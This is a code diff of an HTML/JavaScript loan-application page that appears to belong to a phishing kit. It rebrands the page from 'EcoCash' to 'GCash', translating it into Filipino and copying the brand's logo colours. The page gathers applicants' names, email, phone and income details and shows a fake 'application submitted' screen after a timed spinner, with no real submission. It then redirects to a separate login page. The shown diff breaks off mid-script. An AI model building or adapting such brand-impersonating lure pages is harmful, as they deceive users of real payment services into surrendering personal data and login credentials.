@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fil">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash - Loan Application</title>
+    <title>GCash - Aplikasyon sa Loan</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
@@ -17,7 +17,7 @@
         body {
             height: 100%;
             font-family: 'Inter', sans-serif;
-            background: #f5f5f5;
+            background: #f0f2f5;
             overflow: hidden;
         }
         
@@ -38,6 +38,7 @@
             margin-bottom: 10px;
             background: white;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
         }
         
         .back-btn {
@@ -53,12 +54,12 @@
             font-weight: 700;
         }
         
-        .logo-eco {
-            color: #0066ff;
+        .logo-g {
+            color: #007dfe;
         }
         
         .logo-cash {
-            color: #ff0000;
+            color: #007dfe;
         }
         
         .card {
@@ -87,6 +88,7 @@
             font-size: 26px;
             font-weight: 700;
             margin-bottom: 15px;
+            color: #333;
         }
         
         .progress-bar {
@@ -101,7 +103,7 @@
         .progress-fill {
             width: 100%;
             height: 100%;
-            background: linear-gradient(to right, #4361ee, #7209b7);
+            background: linear-gradient(to right, #007dfe, #0056b3);
         }
         
         .step-text {
@@ -115,6 +117,8 @@
             color: #333;
             margin-bottom: 8px;
             font-size: 15px;
+            display: block;
+            text-align: left;
         }
         
         .form-select,
@@ -128,10 +132,11 @@
         }
         
         .summary-box {
-            background: #f8f9ff;
+            background: #f0f7ff;
             padding: 16px;
             border-radius: 16px;
             font-size: 14px;
+            text-align: left;
         }
         
         .summary-row {
@@ -168,7 +173,7 @@
         }
         
         .submit-btn {
-            background: linear-gradient(to right, #4361ee, #7209b7);
+            background: linear-gradient(to right, #007dfe, #0056b3);
             color: white;
             position: relative;
         }
@@ -189,8 +194,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 102, 255, 0.15);
-            /* Transparent bluish */
+            background: rgba(0, 125, 254, 0.15);
             display: none;
             justify-content: center;
             align-items: center;
@@ -202,7 +206,7 @@
             width: 60px;
             height: 60px;
             border: 6px solid #f0f0f0;
-            border-top: 6px solid #0066ff;
+            border-top: 6px solid #007dfe;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-bottom: 30px;
@@ -285,7 +289,7 @@
             width: 20px;
             height: 20px;
             border: 2px solid #f3f3f3;
-            border-top: 2px solid #0066ff;
+            border-top: 2px solid #007dfe;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
@@ -293,7 +297,7 @@
         .go-login-btn {
             width: 100%;
             padding: 16px;
-            background: #0066ff;
+            background: #007dfe;
             color: white;
             border: none;
             border-radius: 50px;
@@ -307,88 +311,99 @@
 <body>
     <header>
         <button class="back-btn" onclick="history.back()">←</button>
-        <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
+        <div class="logo"><span class="logo-g">G</span><span class="logo-cash">Cash</span></div>
         <div></div>
     </header>
 
     <main class="card">
         <div class="top">
-            <h1 class="form-title">Final Review</h1>
+            <h1 class="form-title">Panghuling Pagsusuri</h1>
             <div class="progress-bar">
                 <div class="progress-fill"></div>
             </div>
-            <div class="step-text">Step 3 of 3</div>
-            <label class="form-label">Employment Status</label>
+            <div class="step-text">Hakbang 3 sa 3</div>
+
+            <label class="form-label">Katayuan sa Trabaho</label>
             <select class="form-select" id="employmentStatus">
-                <option>Employed</option>
-                <option>Self-Employed</option>
-                <option>Unemployed</option>
-                <option>Student</option>
+                <option>May Trabaho (Employed)</option>
+                <option>Sariling Negosyo (Self-Employed)</option>
+                <option>Walang Trabaho (Unemployed)</option>
+                <option>Estudyante (Student)</option>
             </select>
-            <label class="form-label">Annual Income ($)</label>
+
+            <label class="form-label">Taunang Kita (₱)</label>
             <input type="number" class="form-input" id="annualIncome" placeholder="50000">
+
             <div class="summary-box" id="summaryBox">
-                <!-- Filled dynamically by JavaScript -->
+                <!-- Dynamic Summary -->
             </div>
         </div>
         <div class="btn-group">
-            <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
-            <button class="submit-btn" id="submitBtn">SUBMIT APPLICATION</button>
+            <button class="prev-btn" onclick="history.back()">NAKARAAN</button>
+            <button class="submit-btn" id="submitBtn">IPASA ANG APLIKASYON</button>
         </div>
     </main>
-    <footer>© 2025 EcoCash</footer>
-    <!-- Spinner Overlay (Transparent Bluish) -->
+
+    <footer>© 2025 GCash</footer>
+
+    <!-- Spinner Overlay -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
     </div>
+
     <!-- Success Overlay -->
     <div id="successOverlay">
         <div class="success-card">
             <div class="check-icon">✓</div>
-            <div class="success-title">Loan Application Submitted</div>
+            <div class="success-title">Naisumite na ang Loan Application</div>
             <div class="success-msg">
-                Your loan application has been submitted. Please wait for approval.<br><br> You will receive a confirmation message. For now, proceed to EcoCash.
+                Matagumpay na naisumite ang iyong loan application. Mangyaring maghintay para sa pag-apruba.<br><br> Makakatanggap ka ng mensahe ng kumpirmasyon. Sa ngayon, pumunta sa GCash.
             </div>
             <div class="redirect-bar">
                 <div class="loader"></div>
-                Redirecting to EcoCash login in <span id="countdown">3</span>...
+                Inililipat sa GCash login sa <span id="countdown">3</span>...
             </div>
-            <button class="go-login-btn" onclick="window.location.href='login.html'">Go to Login Now</button>
+            <button class="go-login-btn" onclick="window.location.href='login.html'">Pumunta sa Login Ngayon</button>
         </div>
     </div>
+
     <script>
         const summaryBox = document.getElementById('summaryBox');
         summaryBox.innerHTML = `
-            <div class="summary-row"><span>Loan Type:</span><span class="summary-value">${localStorage.getItem('loanType') || 'Personal Loan'}</span></div>
-            <div class="summary-row"><span>Amount:</span><span class="summary-value">$${parseFloat(localStorage.getItem('loanAmount') || 5000).toLocaleString()}</span></div>
-            <div class="summary-row"><span>Term:</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} Months</span></div>
-            <div class="summary-row"><span>Purpose:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Not specified'}</span></div>
-            <div class="summary-row"><span>Name:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
+            <div class="summary-row"><span>Uri ng Loan:</span><span class="summary-value">${localStorage.getItem('loanType') || 'Personal Loan'}</span></div>
+            <div class="summary-row"><span>Halaga:</span><span class="summary-value">₱${parseFloat(localStorage.getItem('loanAmount') || 5000).toLocaleString()}</span></div>
+            <div class="summary-row"><span>Termino:</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} Buwan</span></div>
+            <div class="summary-row"><span>Layunin:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Hindi tinukoy'}</span></div>
+            <div class="summary-row"><span>Pangalan:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
             <div class="summary-row"><span>Email:</span><span class="summary-value">${localStorage.getItem('email') || 'N/A'}</span></div>
-            <div class="summary-row"><span>Phone:</span><span class="summary-value">+263 ${localStorage.getItem('phone') || 'N/A'}</span></div>
+            <div class="summary-row"><span>Telepono:</span><span class="summary-value">+63 ${localStorage.getItem('phone') || 'N/A'}</span></div>
         `;
+
         if (localStorage.getItem('employmentStatus')) {
             document.getElementById('employmentStatus').value = localStorage.getItem('employmentStatus');
         }
         if (localStorage.getItem('annualIncome')) {
             document.getElementById('annualIncome').value = localStorage.getItem('annualIncome');
         }
+
         document.getElementById('submitBtn').addEventListener('click', function() {
             const income = document.getElementById('annualIncome').value.trim();
             if (!income || income < 1000) {
-                alert('Please enter a valid annual income (minimum $1,000).');
+                alert('Mangyaring maglagay ng wastong taunang kita (minimum ₱1,000).');
                 return;
             }
+
             localStorage.setItem('employmentStatus', document.getElementById('employmentStatus').value);
             localStorage.setItem('annualIncome', income);
-            // Show transparent bluish spinner for 3 seconds
+
             const spinnerOverlay = document.getElementById('spinnerOverlay');
             spinnerOverlay.style.display = 'flex';
+
             setTimeout(() => {
                 spinnerOverlay.style.display = 'none';
                 const successOverlay = document.getElementById('successOverlay');
                 successOverlay.style.display = 'flex';
-                // Countdown 3 seconds then auto redirect
+
                 let seconds = 3;
                 const countdownEl = document.getElementById('countdown');
                 const timer = setInterval(() => {
